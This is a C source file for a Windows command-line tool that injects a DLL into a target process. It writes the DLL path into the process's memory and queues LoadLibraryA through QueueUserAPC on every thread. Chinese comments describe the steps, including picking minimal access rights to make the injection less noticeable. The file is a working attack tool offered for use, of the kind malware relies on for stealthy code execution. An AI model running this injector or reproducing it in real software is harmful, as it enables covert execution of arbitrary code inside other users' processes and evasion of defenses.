#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>

int main(int argc, char* argv[]) {
	if (argc != 3) {
		printf("Uasage: %s <PID> <DLLPATH>\n", argv[0]);
		return -1;
	}

	DWORD dwPid = (DWORD)atoi(argv[1]);
	const char* DllPath = argv[2];

	printf("[*] Target PID: %lu\n", dwPid);
	printf("[*] Dll Path  : %s\n", DllPath);

	// 1. 打开目标进程
	// 遵循最小权限原则，降低注入动静
	HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
		FALSE, dwPid);
	if (hProcess == NULL) {
		printf("[!] OpenPorcess failed, error: %lu\n", GetLastError());
		return -1;
	}

	// 2. 获取 LoadLibraryA 地址
	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	if (hKernel32 == NULL) {
		printf("[!] GetModuleHandle failed, error: %lu\n", GetLastError());
		CloseHandle(hProcess);
		return -1;
	}
	PAPCFUNC pfnLoadLibraryA = (PAPCFUNC)GetProcAddress(hKernel32, "LoadLibraryA");
	if (pfnLoadLibraryA == NULL) {
		printf("[!] GetProcess failed\n");
		CloseHandle(hProcess);
		return -1;
	}
	printf("[*] LoadLibraryA address: %p\n", pfnLoadLibraryA);

	// 3. 在目标进程内分配内存，写入dll路径
	SIZE_T szPath = strlen(DllPath) + 1;
	LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, szPath,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pRemoteBuf == NULL) {
		printf("[!] VirtualAllocEx failed, error: %lu\n", GetLastError());
		CloseHandle(hProcess);
		return -1;
	}
	printf("[*] Remote memry allocated at %p\n", pRemoteBuf);

	if (!WriteProcessMemory(hProcess, pRemoteBuf, DllPath, szPath, NULL)) {
		printf("[!] WriteProcessMemory failed, error: %lu\n", GetLastError());
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return -1;
	}

	// 4. 枚举目标进程中所有线程，逐一向每个线程投递 APC
	DWORD dwQueued = 0;
	DWORD dwFailed = 0;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot failed, error: %lu\n", GetLastError());
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return -1;
	}

	THREADENTRY32 te = { sizeof(THREADENTRY32) };
	if (Thread32First(hSnapshot, &te)) {
		do {
			if (te.th32OwnerProcessID != dwPid)
				continue;

			printf("[*] Attempting thread %lu...\n", te.th32ThreadID);

			HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
			if (hThread == NULL) {
				printf("[!] OpenThread(%lu) failed, error: %lu, skip..\n", te.th32ThreadID, GetLastError());
				dwFailed++;
				continue;
			}

			if (!QueueUserAPC(pfnLoadLibraryA, hThread, (ULONG_PTR)pRemoteBuf)) {
				printf("[!] QueueUserAPC(%lu) failed, error: %lu\n", te.th32ThreadID, GetLastError());
				dwFailed++;
			}
			else {
				printf("[*] APC successfully queued to thread %lu\n", te.th32ThreadID);
				dwQueued++;
			}

			CloseHandle(hThread);
		} while (Thread32Next(hSnapshot, &te));
	}

	CloseHandle(hSnapshot);

	printf("[*] Queued: %lu, Failed: %lu\n", dwQueued, dwFailed);
	if (dwQueued == 0) {
		printf("[!] No threads were queued, cleaning up...\n");
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return -1;
	}

	// 5. 注入器的进程维持，保证远程内存不被提前释放
	printf("[*] APC queued. Press Enter to eixt (after target thread calls Ex_funcs)...\n");
	getchar();

	// 6. 清理
	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	printf("[*] Done.\n");
	return 0;
}